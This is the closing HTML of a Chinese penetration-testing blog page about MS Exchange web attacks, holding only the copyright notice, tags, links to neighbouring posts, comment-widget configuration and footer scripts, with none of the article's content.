</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">J0k3r</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://j0k3r.top/2020/08/17/MS Exchange Web/">http://j0k3r.top/2020/08/17/MS Exchange Web/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://j0k3r.top">J0k3r's Blog</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/渗透/">渗透</a><a class="post-meta__tags" href="/tags/Exchange/">Exchange</a></div><div class="social-share"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/js/social-share.min.js"></script><nav id="pagination"><div class="prev-post pull-left"><a href="/2020/08/19/java-ognl/"><i class="fa fa-chevron-left">  </i><span>Java OGNL 表达式注入</span></a></div><div class="next-post pull-right"><a href="/2020/08/14/struct2-s2-059/"><span>S2-059 漏洞与不同 Struct2 版本的 Payload 分析</span><i class="fa fa-chevron-right"></i></a></div></nav><div id="vcomment"></div><script src="https://cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js"></script><script>var notify = 'true' == true ? true : false;
var verify = 'true' == true ? true : false;
var GUEST_INFO = ['nick','mail','link'];
var guest_info = 'nick,mail,link'.split(',').filter(function(item){
  return GUEST_INFO.indexOf(item) > -1
});
guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
window.valine = new Valine({
  el:'#vcomment',
  notify:notify,
  verify:verify,
  appId:'yeOeLCiDRMa7CAnJy2jxA2IY-gzGzoHsz',
  appKey:'eAgtubAYTMshS76hpc1F1UBG',
  placeholder:'Just go go',
  avatar:'mm',
  guest_info:guest_info,
  pageSize:'10',
  lang: 'zh-cn'
})</script></div></div><footer class="footer-bg" style="background-image: url(https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/wallhaven-j5k275.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2017 - 2021 By J0k3r</div><div class="framework-info"><span>驱动 - </span><a href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file-o"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script>if(/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
}</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/assets/katou_01.model.json"},"display":{"superSample":2,"width":300,"height":600,"position":"left","hOffset":-20,"vOffset":-80},"log":false,"tagMode":false});</script></body></html>